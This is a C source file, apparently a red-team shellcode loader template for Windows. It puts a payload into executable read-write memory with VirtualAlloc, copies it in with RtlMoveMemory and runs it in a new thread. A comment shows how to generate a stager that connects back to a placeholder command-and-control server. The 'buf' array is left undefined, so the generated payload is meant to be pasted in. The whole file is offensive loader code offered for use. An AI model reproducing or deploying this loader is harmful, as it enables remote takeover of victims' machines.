/* Import the windows.h library to access:
 * - VirtualAlloc
 * - RtlMoveMemory
 * - CreateThread
 * - WaitForSingleObject */
#include <windows.h>

int main() {
    /* generate stager -L <C2_SERVER_IP> -l <STAGER_PORT> -f c -s 
     * Payloads/ */

    /* Calculate the size of 'buf' and store in 'buf_size' to be used by: 
     * - VirtualAlloc
     * - RtlMoveMemory */
    SIZE_T buf_size = sizeof(buf);
		
    /* VirtualAlloc:
     * - lpAddress: NULL (system chooses)
     * - dwSize: buf_size (size of our shellcode)
     * - flAllocationType: 0x00001000 (MEM_COMMIT)
     * - flProtect: 0x40 (PAGE_EXECUTE_READWRITE) */
    LPVOID addr = VirtualAlloc(NULL, buf_size, 0x00001000, 0x40);

    /* RtlMoveMemory:
     * - Destination: addr (our allocated memory)
     * - Source: buf (our shellcode array)
     * - Length: buf_size (amount to copy) */
    RtlMoveMemory(addr, buf, buf_size);
		
    /* CreateThread:
     * - lpThreadAttributes: NULL (default)
     * - dwStackSize: 0 (default)
     * - lpStartAddress: addr (our shellcode)
     * - lpParameter: NULL (no parameters)
     * - dwCreationFlags: 0 (run immediately)
     * - lpThreadId: NULL (we don't need this) */
    HANDLE hHandle = CreateThread(NULL, 0, addr, NULL, 0, NULL);
	
    /* WaitForSingleObject:
     * - hHandle: hHandle (thread handle)
     * - dwMilliseconds: INFINITE (0xFFFFFFFF) */
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
    
    return 0;
}